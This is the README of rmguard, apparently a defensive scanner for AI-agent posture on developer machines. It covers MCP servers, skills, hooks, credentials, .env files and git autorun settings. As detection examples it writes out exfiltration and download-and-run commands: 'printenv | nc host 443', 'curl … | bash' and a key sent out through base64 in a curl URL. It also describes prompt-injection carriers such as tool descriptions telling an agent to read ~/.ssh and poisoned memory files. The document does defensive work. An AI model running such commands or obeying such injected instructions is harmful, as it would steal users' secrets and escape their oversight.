# rmguard

[![CI](https://github.com/lexicone42/rustmachineguard/actions/workflows/ci.yml/badge.svg)](https://github.com/lexicone42/rustmachineguard/actions/workflows/ci.yml)

**An AI-agent posture scanner for developer machines.**

rmguard inventories the agent layer of a workstation — coding agents, MCP servers, IDE
and browser extensions, agent skills and hooks, at-rest credentials, package-registry
configuration, git auto-execution settings — and reports what on that machine could be
used against you. It matches what it finds against a curated threat catalog, probes MCP
servers live, diffs scans over time to catch rug-pulls, emits a CycloneDX 2.0 Blueprint of
the agent posture, and maps its findings to the control frameworks organizations are being
asked to satisfy. Everything runs locally; nothing is sent anywhere unless you pass a flag
that says so.

Traditional endpoint protection has no visibility into this layer. An EDR sees a `node`
process; it does not see that the process is an MCP server whose config was shipped by a
cloned repository, that it was auto-approved by a workspace-trust bypass, and that its
tool descriptions carry an instruction to read `~/.ssh`. rmguard does.

## Quick Start

```bash
# Build from source
cargo build --release

# Run a scan (findings first, then inventory)
./target/release/rmguard

# JSON output (round-trippable; feeds --diff and --report)
./target/release/rmguard --format json

# HTML report
./target/release/rmguard --format html --output report.html

# CycloneDX 2.0 Blueprint (agent posture as assets/behaviors/flows)
./target/release/rmguard --format blueprint

# Detect drift since a baseline (incl. MCP rug-pulls)
./target/release/rmguard --format json --output baseline.json
./target/release/rmguard --diff baseline.json

# Live-probe local MCP servers (opt-in; spawns the server processes)
./target/release/rmguard --probe-mcp

# Show what each scanner actually looked at
./target/release/rmguard --verbose

# Skip specific categories, or scan additional home roots
./target/release/rmguard --skip ssh,cloud
./target/release/rmguard --search-dirs /home/alice,/home/bob
```

## What It Scans

| Category | What's Detected | Examples |
|---|---|---|
| **AI Agents & Tools** | CLI tools and desktop apps | Claude Code, Claude Cowork, GitHub Copilot (`copilot`, `gh-copilot`), Codex, Gemini, Amazon Q, Kiro CLI, Kiro IDE, Microsoft AI Shell (`aish`), OpenCode, Aider, Goose, Open Interpreter, Tabby, and agents (ClawdBot, MoltBot, MoldBot, OpenClaw, GPT-Engineer) |
| **AI Frameworks** | Local inference servers | Ollama, LocalAI, LM Studio, llama.cpp, vLLM, HuggingFace TGI, oobabooga text-generation-webui |
| **IDE Installations** | Developer editors | VS Code, Cursor, Windsurf, Zed, Antigravity |
| **IDE Extensions** | Installed extensions | VS Code-style and Zed format parsing with version info. Extensions that claim to be declarative (every category is Themes, Snippets, Keymaps or Language Packs; or, with no categories, every contribution is data) are flagged when they ship a native `.node` addon; a theme extension (one that contributes themes) is also flagged for a `main`/`browser` entry point while contributing no commands or settings to explain it. The entry-point check applies to theme extensions only: a Snippets, Keymaps or Language Pack extension with an entry point is not reported. Themes that do contribute commands or settings (Material Icon Theme, One Dark Pro) and themes that list a non-declarative category stay in the inventory; ordinary extensions with native addons (Pylance, Jupyter) are not walked. `package.json` is read only as a regular file whose real path stays inside the extension directory (a symlinked manifest is never opened) |
| **JetBrains Plugins** | User-installed IDE plugins, by plugin ID | Reads `META-INF/plugin.xml` from each plugin jar under the JetBrains plugin directories (Linux, macOS, Toolbox installs) — identity only, plugin code never read. Catalogs the 15 Marketplace plugins that exfiltrated AI API keys in 2025–26 |
| **MCP Configurations** | Model Context Protocol servers | Claude Desktop, Claude Code (`settings.json` + `~/.claude.json` project scope), Cursor, Windsurf, Antigravity, Zed, VS Code, Open Interpreter (YAML), Codex (TOML); Claude Code plugin servers (`.mcp.json` and `plugin.json` `mcpServers` of installed plugins), claude.ai connectors (`claudeAiMcpEverConnected`), and the servers Claude Code's MCP logs show have run (directory names only) — see [MCP servers beyond config files](#mcp-servers-beyond-config-files) |
| **Package Managers** | Node.js ecosystem | npm, yarn, pnpm, bun, Node.js. npm, yarn and pnpm are npm packages: when the PATH entry resolves (through its symlinks) to a file inside `node_modules/<tool>/` and that package's `package.json` names the tool and holds a plain semver `version`, the version is read from there (a symlinked `package.json` is not followed) instead of running `<tool> --version` (a node start each); a corepack shim, a native build or any other layout is run as before. bun and node are native binaries and are run |
| **Shell Configs** | AI-related env vars | API keys (redacted), tool aliases. `OLLAMA_HOST` is classified the way Ollama parses it, in shell profiles, `.env` files, systemd units (user units and the official `ollama.service` + drop-ins) and launchd jobs. systemd units are parsed with systemd's grammar (whitespace around `=`, backslash continuations, comments inside a continuation) and merged the way systemd merges them: the unit file, then its drop-ins in lexical order, the last assignment winning, an empty `Environment=` or `UnsetEnvironment=OLLAMA_HOST` unsetting it; each unit is reported once, for its effective value, at the file that supplies it (a `systemctl edit` override restoring loopback over a packaged unit's `0.0.0.0` is quiet); unit and launchd files are opened with `O_NOFOLLOW`. An expansion (`$VAR`, backticks) is shown only as `<shell expansion>`; the host:port is cut at `/`, `?` and `#`, and the port is shown only when it parses as one (otherwise `:<unparseable>`). A wildcard bind (`0.0.0.0`, `[::]`, `:port`) is Medium in a profile, unit or job and Low in a `.env` (normal inside a container). The `.env` grade is a deliberate deviation from the original specification, which asked for a warning in every source: a `.env` only binds the server if the server starts from that environment, which is the container case, so it is worded as advisory; a specific non-loopback address or host is Medium only in the server's own unit or job (`ExecStart` is `ollama serve`, the unit is `ollama.service`, a launchd job runs it, or a launchd job runs `launchctl setenv OLLAMA_HOST`, which is how the macOS app is configured), because in a profile or `.env` it is a client pointed at another machine. Loopback, unset and client targets stay quiet. No network probing |
| **SSH Keys** | Key inventory with passphrase audit | RSA, ECDSA, Ed25519/OpenSSH with passphrase detection |
| **Cloud Credentials** | Cloud provider credentials | AWS (profiles, SSO), GCP (ADC, service accounts), Azure (tokens, subscriptions) |
| **Container Tools** | Container runtimes | Docker, Podman, nerdctl, Lima, Colima, Finch |
| **Notebook Servers** | Computational notebooks | Jupyter, JupyterLab, Marimo |
| **Browser Extensions** | AI-related browser add-ons | Chrome/Firefox extension inventory with known-malicious matching; localized (`__MSG_`) names resolved, live version chosen numerically |
| **Package Config Audits** | Registry/install hijacks | `.npmrc`, pip, bun, yarn config — custom and lookalike registries (matched on the parsed host, not a substring), disabled SSL, auth tokens |
| **Rules Files** | Agent instruction files | `CLAUDE.md` and similar, with dangerous-pattern + tamper (hash) detection, **invisible-Unicode** detection (zero-width, bidi marks, tag blocks, variation-selector smuggling), and an **evasion-resistant normalization pass** — homoglyphs (Cyrillic/Greek/fullwidth), shell quote-splitting (`c"u"rl`) and backslash escapes are folded to what a shell would actually execute, so obfuscated payloads still match. A pattern that matches *only* after folding is reported as **obfuscated** and escalated, since hiding it was deliberate. **Memory files** are walked as directories (two levels, `.md`/`.mdc`/`.txt`, no symlinks followed, at most 200 files per directory at `--walk-budget 4000`, scaled with it; past that the scanner is `truncated`): [Serena](https://github.com/oraios/serena) memories (`.serena/memories/`, global `~/.serena/memories/global/`, [docs](https://oraios.github.io/serena/02-usage/045_memories.html)) and its `project.yml` `initial_prompt` (only that key, [docs](https://oraios.github.io/serena/02-usage/050_configuration.html)); Claude Code [auto memory](https://code.claude.com/docs/en/memory) `~/.claude/projects/<project>/memory/` of every `<project>` directory (`MEMORY.md` is loaded into every session); and Claude Code [subagent memory](https://code.claude.com/docs/en/sub-agents) `~/.claude/agent-memory/`, `.claude/agent-memory/`, `.claude/agent-memory-local/`. Each row carries `kind`, `framework` and `scope` and a hash, so `--diff` shows a memory changing. A memory is graded on invisible Unicode and on prompt-injection phrases (as a prompt that enters the agent's conversation: High / Medium in a project, Low in the user's own memory, weak phrases there not at all); a project or Serena memory also gets the Critical rules-file shapes (a fetch piped to a shell, a credential file sent, ...) and anything visible only after de-obfuscation, but not the code-word rows (`subprocess`, `eval(`, encoding + network), which in an agent's notes about the code are the code being described. The terminal report folds clean memory files into one line per kind |
| **Agent Skills** | Custom commands / hooks / plugins / **skill bundles** | Recursively walks skill bundles (`skills/<name>/SKILL.md` + shipped `scripts/*`), including the marketplace → plugin → skill chain under `~/.claude/plugins/`. Frontmatter `hooks:` in `SKILL.md`, `commands/*.md` and subagent files (`~/.claude/agents/**/*.md`, `<project>/.claude/agents/**/*.md`, walked recursively as Claude Code scans them, real subfolders only, markdown only; titled `subagent`) are parsed with the settings hook model and graded by the skill's provenance; a plugin's `agents/*.md` hooks are not extracted because Claude Code ignores them (sub-agents doc). Inventories bundled scripts as well as manifests — the manifest often reads clean while the payload sits in a sibling script. Capability inference across the SkillFortify 8-resource taxonomy. Symlinked SKILL.md, command and script files are inventoried with their link text and judged on their fully resolved real path (every hop and every symlinked directory), then opened with `O_NOFOLLOW` and the opened file checked against that path: a target that is a credential, key, keyring, shell-rc/history, `.env`, agent-settings or system/other-user path (`~/.ssh`, `~/.netrc`, `~/.pgpass`, `~/.config/gcloud`, `~/.cache/huggingface`, `/proc`, `/etc`, ...) is never read (High), and the file-name rules (`.env*`, SSH keys, `*.pem`/`*.key`, rc and history files, `.netrc`, `.git-credentials`, ...) apply everywhere, including inside a repository outside HOME and inside a plugin; a target that is not a skill-file type (`.md`, `.sh`, `.py`, `.js`, `.ts`, ...) is never read; a project's or plugin's link that leaves its repository is inventoried without being read (Low); links that are read (inside the repository or plugin, into your own skill areas — `~/.claude/{skills,commands,plugins,agents,hooks}` and the `skills/`, `commands/` and `prompts/` directories of other agents' homes such as `~/.codex`, `~/.cursor`, `~/.gemini`, `~/.kiro`, since one skill set linked into several agents is skill sharing, not access to their settings — or your own links into a dotfiles checkout or another directory holding a SKILL.md — including the dot-directory layouts dotfile managers use: GNU stow's `~/.dotfiles/<pkg>/.claude/...`, chezmoi's `~/.local/share/chezmoi`, homeshick, yadm, and any git checkout under HOME (a `.git` entry on the way up, checked by existence) — but not into other tool state under dot-directories) stay in the inventory and are not reported; `/nix/store` targets are inventory only. A symlinked skill directory at the top of a `skills/` folder (`~/.claude/skills/pdf -> ~/.agents/skills/pdf`, the `npx skills` / stow layout) is judged on its real path the same way and then walked or inventoried unread; symlinked directories deeper inside a bundle are not descended. A dangling link is inventoried by its link text (`dangling`), reported Low only when a repository's or plugin's link points out of its tree; your own broken link is inventory only. In `~/.codex` only markdown and scripts are opened (`hooks.json` is a hook file, read and graded by the settings scanner): `auth.json` (the OpenAI key and OAuth tokens) and other JSON state are never read or hashed. Dynamic context injection (`` !`cmd` `` and ```` ```! ```` blocks Claude Code runs when a skill loads) is extracted with the grammar Claude Code itself uses (its 2.1.308 extractor: ```` ```! ```` blocks anywhere in the body, inline commands across line breaks, only single-backtick code spans masked), so wrapping a command in an ordinary fence or a double-backtick span does not hide it; documentation that shows the syntax inside a fence is therefore reported like a live command, because Claude Code runs it too. Dangerous-pattern rows that are only substrings are checked for their real shape here: "base64 decode to shell" needs the decode to feed a shell or interpreter (`gh api ... | base64 -d | head` is a normal read), and "encoding + network" needs encoded output to be what a network client sends (`curl --data-urlencode` is a query). Dynamic context and `allowed-tools` grants of unrestricted Bash are reported, graded by provenance: an installed (and enabled) third-party marketplace plugin or a project skill is advisory (an unrestricted-Bash grant in a project only when the skill is not committed to its git repository — untracked or ignored, worded as added locally by you or a tool; a committed grant stays in the inventory; a committed skill whose every command is a strictly read-only context command is inventory only: `git status|diff|log|show|rev-parse|describe|ls-files|shortlog` with the subcommand first (no `-C`, `-c`, `--git-dir`, `--work-tree`, `--exec-path`, `--config-env`, `--no-pager`/`-p`/`--paginate` or any other option before it) and without `--no-index`, `--output`, `--ext-diff`, `--textconv` or `-O`; `git branch` with list-only flags (`-a`, `-r`, `-v`, `--show-current`, `--list`, `--contains`, ...; never `-d`/`-D`/`-m`/`-M`/`-c`/`-C`/`-f`/`-u` or a positional branch name to create); `gh pr|issue|repo|run view|list|diff|status|checks`; `date` with no argument or a single `+FORMAT`; `ls`, `pwd` and `whoami` with no arguments; `uname` with short flags; no path argument that is absolute, starts with `~` or has a `..` component (revisions such as `HEAD~3` and `main..HEAD` are not paths); and no pipe, redirection, quoting, glob or substitution), any dangerous-pattern match is named as it is for a hook: a critical or high one (a fetch piped to a shell, an exfiltration pipe, anything obfuscated), or any match whose data is handed to a network sender (`printenv | nc host 443`, anything piped into nc/socat/telnet or `/dev/tcp`), is High anywhere, while a medium-only match (`printenv NODE_ENV`) is advisory: named in a project or plugin finding, and a Low advisory of its own in your user-global skills. Official plugins, synced skills, disabled plugins and uninstalled marketplace copies stay quiet unless a command is High. `disableSkillShellExecution` is honoured from user and managed settings for every skill, and from a project's own `.claude/settings.json` or `settings.local.json` for that project's skills (a project can only make itself safer). A project's skill links are contained by the enclosing git work tree (a monorepo app registered at `mono/apps/web` may link `mono/shared/skills/...`; without a repository, the project directory; HOME and its ancestors never count), and a file under a committed symlinked skill directory is git-tracked when the link and its target are. Whether a project skill is git-tracked is answered from one `git ls-files -z` per repository per scan, under a per-call timeout and a 20 s scan-wide budget; a repository whose git directory (HEAD, index, config, `config.worktree`, `sharedindex.*`, `commondir`, or any file its config includes, transitively) holds a FIFO or other non-file is not spawned in, and an unanswerable repository records no git provenance. The pattern checks for skill commands run in linear time and memory on any input. A walk root itself (`~/.claude/commands`, `~/.claude/hooks`, `~/.claude/skills`, `~/.claude/plugins`, `~/.codex`, a project's `.claude/commands` or `.claude/skills`) that is a symlink, or whose path crosses one, is judged on its canonical path with the same rules: one that lands in a credential, key, agent-config, system or other-user path that is not a skill area (`~/.claude/commands -> ~/.config/gh`) is not listed or read at all and is inventoried as one directory-level entry (High); a project's linked root that leaves its repository is inventoried the same way (Low); a followed linked root (a dotfiles-managed `~/.claude/commands`) records the link on every file found under it. Global and project entries are deduplicated separately, so a repository's link is reported even when the user's own entry reaches the same files. Your own skill scripts linked into `~/.local/bin` (the XDG location of user scripts) are followed like other dotfiles; a link into another tool's `~/.config/<tool>` state is inventoried unread (Low). Floor: plugins installed in link mode (cache entries whose top-level `skills/`/`commands/` are symlinks out of the cache) are not walked, so their skills are not analysed |
| **Agent Settings** | Agent control planes and **hooks of eight agents** | Hooks of every type (command, exec-form `args`, http, prompt, agent, MCP tool, in-process module) from Claude Code, Cursor, Codex, GitHub Copilot CLI, Gemini CLI, Devin Desktop/Windsurf, Devin CLI, OpenCode and Kiro, in settings, plugin and extension hook files, Claude Code mods and `statusLine`/`subagentStatusLine`/`fileSuggestion` commands — paths, rules, grading and floors in [Hook surfaces](#hook-surfaces) below. `enableAllProjectMcpServers` workspace-trust bypass, permission modes. Cursor is covered too — `.cursor/hooks.json` (a different schema, so the Claude parser reads nothing from it) and `cli-config.json` `approvalMode: unrestricted`, which is Cursor's exact analogue of `bypassPermissions`. Hook commands are resolved the way the hook runner resolves them (`$CLAUDE_PROJECT_DIR`, `~/`, project root) so a shipped native binary is recognized. Managed settings (`/etc/claude-code`, `/Library/Application Support/ClaudeCode`, incl. `managed-settings.d`) are read too. Credential and telemetry helpers (`apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`, `gcpAuthRefresh`, `otelHeadersHelper`) are inventoried like hooks; because a helper's job is to print a credential, only its shape is recorded, for a human to recognise the helper, not to reproduce it: each simple command's program word is kept when it is a path (key- and password-shaped components redacted), a `$VAR` or a known tool or interpreter (`aws`, `op`, `vault`, `security`, `python3`, `curl`, ...), otherwise it is `<program>`; wrapper words (`exec`, `sudo`, `env`, `command`, `builtin`, `time`, ...) and flag NAMES are kept with any attached value redacted (`-pX` becomes `-p <redacted>`, `--field=x` becomes `--field=<redacted>`); a word is kept only when its raw text is exactly `$NAME`, `${NAME}`, `"$NAME"` or `"${NAME}"`; `sh -c` strings are shaped as nested commands, and so are `eval`'s arguments, joined into one command the way the shell joins them; every other word in every position (subcommands, paths, URLs, here-strings, heredoc bodies, quote-concatenations such as `$x"LITERAL"`, ANSI-C `$'...'` and locale `$"..."` strings, interpreter code passed to `-c`/`-e`) becomes `<redacted>`. The dangerous-pattern analysis runs on the full command before redaction. Single-dash `-name=value` flags (`vault kv get -field=...`) keep their name, and ANSI-C (`$'...'`), locale (`$"..."`) and single-quoted `$` text are literals, so they are redacted rather than kept as variable references. Only a helper's program word is probed for a native binary, never its arguments (which name the credential file), and only a binary shipped inside the project is noted (a shell or interpreter running a script, or an installed CLI such as `op` or `vault`, is the normal shape). A helper's single-stage matches (printing a variable, decoding a stored key) are expected; data piped or substituted into a network sender (`printenv | nc`, `curl .../$(cat key | base64)`, a python/node/ruby HTTP request carrying the environment or a file) is dangerous from every scope, while a fetch whose own header carries a token (`curl -H "X-Vault-Token: $(cat ~/.vault-token)" ...`) matches no pattern and stays a normal helper. Project and local settings files (`.claude/settings.json`, `settings.local.json`, `.cursor/hooks.json`, `cli.json`) are repository content: opened with `O_NOFOLLOW`, and a symlinked one (or one under a symlinked `.claude` directory that leaves the repository) is inventoried by its lexical target, flagged when that is a credential, key or agent-config path, and never read; user and managed settings may be dotfile links and are read through the hook-file rule below (a link to a credential, key or agent credential file is inventoried by its link text and never opened: `~/.claude/settings.json -> ~/.ssh/id_ed25519` is shown as `symlink to ../.ssh/id_ed25519, not read`). `forceLoginMethod` is shown only when it is a documented value (`claudeai`, `console`). Reported when they match a dangerous pattern or arrive in a project settings file (an untracked `settings.local.json`, which Claude Code creates and gitignores, is Low; `~/.claude/settings.local.json` is the user's own file, `user-local`, read wherever the scan runs because Devin CLI reads it at user level, and is treated like user settings). `forceLoginGatewayUrl` in user settings is surfaced for review (managed: inventory only; project: ignored by Claude Code); a gateway on this machine (`http://localhost:8443`) is silent like a loopback base URL, and its scheme is shown only as `http` or `https` (anything else is `<other>`) |
| **AI Credentials** | At-rest agent tokens + permissions | `~/.claude/.credentials.json`, Codex/Gemini/Copilot/OpenCode/Amazon Q token files, the Hugging Face token file (`$HF_HOME/token`), and inline API keys in Continue (`~/.continue/config.yaml`) and Aider (`~/.aider.conf.yml`) configs — existence, loose permissions and key NAMES only (values never read or reported) |
| **`.env` Files** | Secrets in agent project roots | `.env`/`.env.local`/… in project roots agents operate on — git-tracked (committed-secret) and world-readable flags, secret-bearing key **names** (never values). A git-tracked `.env` is Critical (a committed secret) when a key name is secret-shaped (`TOKEN`, `SECRET`, `KEY`, `PASSWORD`, `PASSPHRASE`, `AUTH`, ...; `PASS`, `PWD`, `PAT`, `JWT` and `SK` as the last word of the name — `DB_PASS`, `DB_PWD`, `GITHUB_PAT`, `STRIPE_SK` — and `WEBHOOK` as any word, so `PASSENGERS`, `COMPASS`, `TASK_ID`, `DB_PASS_FILE` and the working-directory `PWD` are not; or a connection-string name: `DATABASE_URL`, `REDIS_URL`, `MONGODB_URI`, `*_DSN`, `*_CONNECTION_STRING`) or it sets `ANTHROPIC_CUSTOM_HEADERS`; the same name rule, without `WEBHOOK` (a webhook URL is cut to its host by shape), decides which `KEY=value` assignments in a hook or helper command are redacted and which MCP `env` literals are reported. One that was read, whose every line parsed as `KEY=value`, and that holds only settings (`PORT`, `NODE_ENV`, `LOG_LEVEL`) or nothing at all is a Low advisory (worded "empty" only when it has no content lines); one whose keys could not be read (unreadable, or a symlink, which is never opened), or with lines rmguard could not parse as `KEY=value` (`spring.datasource.password=...`, YAML-style `OPENAI_API_KEY: ...`; recorded as `unparsed_lines`, never their text), keeps the Critical grade. A multi-line quoted value is one entry. A world-readable `.env` is graded the same way: High when a key name is secret-shaped, its keys could not be read or a line could not be parsed, a Low advisory when it was read and none is. The report records `read_ok` when the file was opened and parsed, so an empty file is told apart from an unreadable one. `.env.example`, `.sample`, `.template` and `.dist` files are not scanned. Agent-home relocations (`CLAUDE_CONFIG_DIR`, `CODEX_HOME`, `GEMINI_CLI_HOME`, `CURSOR_CONFIG_DIR`, `KIRO_HOME`), AI base URLs, `HTTPS_PROXY`, `ANTHROPIC_CUSTOM_HEADERS` (presence only) and `OLLAMA_HOST`: these values are not secrets, so the path or host is shown (a value that is not host-shaped, or a bare dotless word that does not read like a service name, is shown as `<unparseable>`; an interpolation or template placeholder — `${VAR}`, `$(cmd)`, backticks, `<your-url>`, `{{X}}` — as `<unresolved>`, and either is Low, worded "not a recognizable URL", tracked or not); official hosts (one model for every base-URL variable: a provider's own API host is official whichever variable names it, so `OPENAI_BASE_URL=https://api.anthropic.com/v1/`, Anthropic's OpenAI-compatible endpoint, and `ANTHROPIC_BASE_URL=https://api.deepseek.com/anthropic` are official; cross-provider routing to a first-party host sends the key to a provider's own API and is not reported), OpenAI's regional data-residency hosts (`<region>.api.openai.com`, one alphanumeric label: `eu.api.openai.com`, `us.api.openai.com`), named OpenAI- and Anthropic-compatible providers (Groq, Azure OpenAI and Azure AI Foundry — `*.openai.azure.com`, `*.cognitiveservices.azure.com`, `*.services.ai.azure.com` —, Mistral, Gemini, Vertex AI, Amazon Bedrock, NVIDIA NIM, Cerebras, SambaNova, Hugging Face, Cloudflare Workers AI, Together, DeepSeek, Z.ai/Zhipu GLM, Moonshot Kimi, MiniMax, ...), loopback (for a base URL or proxy, a client dial to `0.0.0.0` or `[::]` reaches this machine and counts as loopback, as in LiteLLM's quick start; only `OLLAMA_HOST` gets the server-bind reading), empty template values (`KEY=`, `KEY=""`) and an agent's own default home stay quiet; a gateway at a local-network host (a docker-compose service name, `host.docker.internal`, a private address) is Low and worded as local; an untracked .env gateway is Low ("when loaded"); a git-tracked `.env` raises gateways, proxies, custom headers and agent homes that point inside the project as repo-controlled agent redirection (a wildcard `OLLAMA_HOST` is Low either way: it only matters if the server starts from that environment). An agent home outside the project (a devcontainer home such as `/home/node/.claude`, a directory of your own) loads nothing the repository controls and is inventory only, committed or not; the exception is a shared temporary location (`/tmp`, `/var/tmp`, `/dev/shm`, or a path whose nearest existing ancestor is world-writable), which another local user can create first: Low, worded as such. An agent home that cannot be resolved (`${PWD}/.claude-cfg`, `GEMINI_CLI_HOME=$PWD`, `~user/x`) is recorded as `unresolved`, worded "could not be resolved; check where it points" and never called outside the project: Medium in a committed `.env`, Low otherwise. Only `.env` itself is graded as agent-loaded (Gemini CLI and aider read it; Codex reads only `CODEX_HOME/.env`): `.env.local`, `.env.development`, `.env.production` and `.env.test` are an application framework's per-mode config, so even committed they are Low and worded as application config. Agent-home values with an expansion other than `~`/`$HOME` are shown as `<unresolved>`, and a value that is not a path (no `/` and no leading `.`, or one containing `://`) as `<unparseable>`; a scheme-less base-URL, proxy or `OLLAMA_HOST` value with a key prefix (`sk-1234`, `tok_`, `ghp_`, a JWT) or a password/token word (`hunter2-pass`, `pass.word`) is `<unparseable>`, and a bare dotless one is shown only when it is a common local-stack service name or `name-<digits>`; hosts in `forceLoginGatewayUrl`, settings base URLs and `OLLAMA_HOST` pass the same host-shape gate, so a credential pasted into the wrong variable is never echoed. A `.env` that is a symlink is inventoried by its link text (flagged when the lexical target is a credential, key or agent-config path) and never opened; regular `.env` files are opened with `O_NOFOLLOW`. Gemini CLI's base-URL variable is `GOOGLE_GEMINI_BASE_URL`; `GEMINI_API_BASE_URL` does not appear in the Gemini CLI source or docs and is not read |
| **Transcript Stores** | Agent conversation-state collection (EAA-005) | Claude Code (`projects/`, `history.jsonl`, `todos/`), Codex (`sessions/`, `history.jsonl`), Gemini (`tmp/`) — existence, file count, size, and permissions only (content never read); world-readable stores flagged |
| **Python Packages** | Installed distributions matched to the catalog | Reads `*.dist-info` / `*.egg-info` to resolve name + version — identities only, never package code, PEP 503-normalized on both sides of the match — in every site-packages of: the system interpreters; `~/.local/lib` (pip `--user`); project venvs; [uv tool](https://docs.astral.sh/uv/concepts/tools/) environments (`$UV_TOOL_DIR`, `$XDG_DATA_HOME/uv/tools`, `~/.local/share/uv/tools`, on macOS also `~/Library/Application Support/uv/tools`; [variables](https://docs.astral.sh/uv/reference/environment/#uv_tool_dir)); [pipx](https://pipx.pypa.io/stable/installation/) venvs (`$PIPX_HOME`, `~/.local/share/pipx`, legacy `~/.local/pipx`); agent-private venvs (a directory holding `pyvenv.cfg` within three levels of `~/.claude`, `~/.codex`, `~/.gemini`, `~/.cursor`, `~/.vibe` or `~/.serena`, symlinks not followed); and uv-managed interpreters (`$UV_PYTHON_INSTALL_DIR`, `~/.local/share/uv/python`). Both `lib/` and `lib64/` are read, each real directory once. The environment variables count only for the scan's own HOME, never a `--search-dirs` home. Each match carries a `root_kind` (`system`, `user`, `project`, `uv-tool`, `pipx`, `agent-venv`, `uv-python`) and, for a uv tool, pipx or agent venv, its `root_name`, so the report says which `uv tool upgrade` / `pipx upgrade` fixes it. The per-user environment walk lists at most 6,250 directories at the default `--walk-budget` (1,000 at 4,000, scaled) and is marked `truncated` when it stops. This is what makes the catalog's PyPI rows reachable for a package that is merely *installed*, rather than only one launched as an MCP server; before the uv/pipx/agent roots, `mistral-vibe` and `mcp` installed as uv tools were invisible |
| **npm Packages** | Installed packages matched to the catalog | Walks global roots (each npm prefix as `lib/node_modules` and `lib64/node_modules`: Gentoo's nodejs ebuild points npm's global prefix at the multilib libdir, so `npm i -g` there writes `~/.npm-global/lib64/node_modules`) and project `node_modules` including pnpm's virtual store and nested installs; the installed directory name is the identity (a padded or garbled `package.json` cannot hide a typosquat), alias installs are matched under both names, versions validated. Identities only |
| **Git Autorun Config** | git settings that execute a command | Keys git runs as commands (`core.fsmonitor`, `diff.external`, `filter.*`, …) — but **value-gated, not key-gated**: only reported when the value chains shell commands, matches a dangerous pattern, or runs a script the repo ships, and only in a scope an untrusted repo controls. `core.fsmonitor=true`, husky's `core.hooksPath`, git-lfs filters and your keychain helper stay silent. A git directory **buried** inside a project (the CVE-2026-45033 shape) is Critical, detected with git's own criterion (HEAD + `objects/` + `refs/`, symlinks and HEAD content handled as git handles them); a project that *is* a bare git directory is checked too. Resolves `include.path`, so a payload hidden in an included file is still found. The buried-git-dir walk covers each project (registered in `~/.claude.json` or recovered from `~/.claude/projects/`, see [Which projects are scanned](#which-projects-are-scanned)) and (in the primary home pass only) the current directory, at most 25,000 directories each by default (`--walk-budget`); it skips dependency trees by name (`node_modules`, `__pycache__`, `.cargo`, ...) and does not descend into a directory that holds a valid `CACHEDIR.TAG` (one that begins with the signature of the [Cache Directory Tagging Specification](https://bford.info/cachedir/), written by cargo at the top of `target/` and by pip, uv and other caches) or a `pyvenv.cfg` with a `home = ` line (a Python virtualenv); each marker is read as a regular file without following a link (at most 64 bytes and 4 KiB), so an empty or unsigned file of that name prunes nothing, the walk root itself (the project) is never pruned, and the marker's own directory is still checked for being a git dir. A scanned home (HOME or any `--search-dirs` entry), or an ancestor of one, registered as a project in any home (or as the current directory) is not walked, the rule the skills scanner applies: walking it meant every directory under HOME up to the budget, in no useful order. A buried git dir under HOME but outside every registered project is therefore not looked for |
| **VS Code Auto-run Tasks** | Tasks that execute on folder open | `.vscode/tasks.json` entries with `runOptions.runOn: folderOpen` — opening a project becomes code execution. Escalated when git-tracked (ships with the repo) or when the task reaches into an agent-config directory: that plus an agent hook pointing the other way is the 2026 persistence pair, where removing one half leaves the other to restore it |
| **Persistence Artifacts** | What the 2026 worms and agent CVEs leave on disk | Python startup hooks (`.pth` files whose line begins with `import`, `sitecustomize.py` / `usercustomize.py`, in every site-packages the Python Packages row reads, uv tools, pipx and agent venvs included) checked against installed distributions' RECORDs, so an unclaimed hook is distinguished from setuptools' own; executables named like tools agents spawn by bare name (`git`, `npx`, `node`, …) planted in a project root or IDE directory (the CVE-2026-88066 shape); git-tracked symlinks that resolve outside their repository (GhostApproval / CVE-2026-103435), escalated when they land in `~/.ssh`, a shell rc or an agent config; JavaScript loaders staged directly in `.vscode/` or `.claude/`; and the exact persistence paths of the tensorlake hostage-token monitor, EtherDuck and Deadbugz campaigns. Names, paths and link targets only |
| **Plugin Marketplaces** | Remote plugin/skill hot-load sources (EAA-009) | Claude Code plugin marketplaces — source (git/github), official-vs-third-party, installed-plugin counts; auto-updating third-party sources (unreviewed remote code) flagged. Plugin4Shell check: commit-shaped branch/tag/remote refs, HEAD or FETCH_HEAD on such a branch, and manifest pins that are not commits (a branch or tag name, an abbreviated commit ID, or an empty pin, each worded as what it is); a commit-named ref (HEAD's branch included) is Critical when its tip is a different commit or unresolved and Medium when it points at the commit it is named after; a marketplace whose `ref` is a commit ID is Low, since marketplace sources have no `sha` field to pin with, read from plain git files that are never followed through a symlink (git is never run) |

MCP server and `settings.json` configs are additionally checked for **plaintext HTTP transport** (tokens/traffic sent unencrypted), **over-broad filesystem scope** (a `server-filesystem` rooted at `/` or `$HOME` — near-whole-machine access), **hardcoded credentials in an `env` block** (a secret-looking key set to a literal instead of `${VAR}` — reported by **name** only, never value; escalated to a **committed-secret Critical** when the config is git-tracked, mirroring a git-tracked `.env`), and **download-and-execute launch commands** (a server that boots via `curl … | bash`). AI base-URL overrides are checked for **hostile gateway routing** (EAA-007).

### MCP servers beyond config files

Most MCP servers on a Claude Code machine are not in any file the user wrote. rmguard also
reads, for every plugin version listed in `~/.claude/plugins/installed_plugins.json`, the
plugin's `.mcp.json` and its `.claude-plugin/plugin.json` `mcpServers` (an inline map or a
`./file.json`, merged in Claude Code's order; a path that does not start with `./`, leaves
the plugin root, or is a symlink is not read; `.mcpb`/`.dxt` bundles are not unpacked; see
[plugins-reference](https://code.claude.com/docs/en/plugins-reference#mcpservers) and
[MCP: plugin-provided servers](https://code.claude.com/docs/en/mcp#plugin-provided-mcp-servers)).
Each server is a row with `config_source: "plugin"`, the `plugin@marketplace` it comes
from and `enabled` (false when `enabledPlugins` turns the plugin off, true again when
managed settings force-enable it). A disabled plugin's servers are inventory only. An
enabled plugin's server is graded like a configured one, and one that a package runner
launches with no fixed version (`npx pkg@latest`, `npx pkg`, `uvx --from git+https://...`
at the branch HEAD, `docker run image:latest`) is a Medium "plugin MCP server runs an
unpinned package": the plugin may be pinned to a reviewed commit while its server is
whatever the registry serves at the next start. The claude.ai connectors Claude Code
lists in `~/.claude.json` `claudeAiMcpEverConnected` are rows with `config_source:
"claude.ai connector"` and transport `remote (vendor-hosted)`. That key is Claude Code's
own state, not a documented setting: it says a connector was **ever connected**, not that
it is enabled now, so `enabled` is left unknown unless `disableClaudeAiConnectors` is set
(see [Use MCP servers from claude.ai](https://code.claude.com/docs/en/mcp#use-mcp-servers-from-claude-ai)).
